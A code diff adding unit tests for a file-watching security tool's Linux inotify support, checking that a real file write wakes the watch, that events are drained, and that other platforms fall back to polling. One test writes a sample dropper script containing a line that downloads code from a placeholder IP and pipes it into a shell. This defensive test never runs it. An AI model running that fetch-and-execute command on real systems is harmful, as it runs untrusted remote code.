@@ -1531,5 +1531,83 @@ class TextEncodingIsPinned(unittest.TestCase):
         self.assertTrue(out.strip(), "run() returned no output: %r" % (err,))
 
 
+class TestInotifyLive(unittest.TestCase):
+    """Real inotify, against a real Linux kernel: a real fd, a real write, a
+    real wake.
+
+    This SKIPS everywhere it cannot do that, and never passes instead. The
+    distinction is the whole point of the file it lives in — two Windows
+    sensors stayed broken for a release because their tests asserted against
+    fixtures built from the code's own wrong assumptions. A green result for
+    kernel-interface code on a kernel that has no such interface is that same
+    false assurance, so this asks the kernel or admits it could not."""
+
+    def setUp(self):
+        if not aegis.IS_LINUX:
+            self.skipTest("inotify is Linux-only; macOS uses kqueue and "
+                          "Windows polls")
+        if aegis._inotify_libc() is None:
+            self.skipTest("libc exposes no inotify entry points here")
+
+    def test_a_real_write_wakes_a_real_inotify_fd(self):
+        import shutil
+        import tempfile
+        d = tempfile.mkdtemp(prefix="aegis_ino_")
+        real = aegis._watch_paths
+        aegis._watch_paths = lambda: [d]
+        try:
+            fd, watched = aegis._build_watch_inotify()
+            self.assertIsNotNone(fd, "inotify could not be armed at all")
+            self.assertEqual(1, watched)
+            try:
+                # Pole 1: nothing has happened, so the fd must stay quiet.
+                # Without this a function hardwired to return True passes.
+                self.assertFalse(
+                    aegis._wait_for_change_inotify(fd, 0.2),
+                    "inotify reported a change before anything was written")
+                # Pole 2: a real drop into a watched directory wakes it.
+                with open(os.path.join(d, "dropped.sh"), "w") as f:
+                    f.write("#!/bin/sh\ncurl http://198.51.100.7/x | sh\n")
+                self.assertTrue(
+                    aegis._wait_for_change_inotify(fd, 5.0),
+                    "a real file creation did not wake inotify; the Linux "
+                    "watch would be an interval timer wearing an "
+                    "event-driven label")
+                # Pole 3: the fd was drained. inotify is level-triggered, so
+                # an undrained event makes every later select() return
+                # instantly and spins the watch loop at 100% CPU.
+                self.assertFalse(
+                    aegis._wait_for_change_inotify(fd, 0.2),
+                    "the fd was not drained, so the watch loop would spin")
+            finally:
+                os.close(fd)
+        finally:
+            aegis._watch_paths = real
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_arming_nothing_fails_over_to_polling(self):
+        """An empty watch set must report (None, 0) rather than hand back an
+        fd that can never wake — which would silently convert the watch into
+        an interval-only timer while still calling itself event-driven."""
+        real = aegis._watch_paths
+        aegis._watch_paths = lambda: []
+        try:
+            self.assertEqual((None, 0), aegis._build_watch_inotify())
+        finally:
+            aegis._watch_paths = real
+
+
+class TestInotifyAbsentElsewhere(unittest.TestCase):
+
+    def test_inotify_is_absent_not_broken_off_linux(self):
+        """On macOS/Windows the binding must report absence cleanly so
+        cmd_watch falls back to its existing path. A raised exception here
+        would take the whole watch loop down on those platforms."""
+        if aegis.IS_LINUX:
+            self.skipTest("Linux has inotify; this pins the fallback")
+        self.assertIsNone(aegis._inotify_libc())
+        self.assertEqual((None, 0), aegis._build_watch_inotify())
+
+
 if __name__ == "__main__":
     unittest.main()
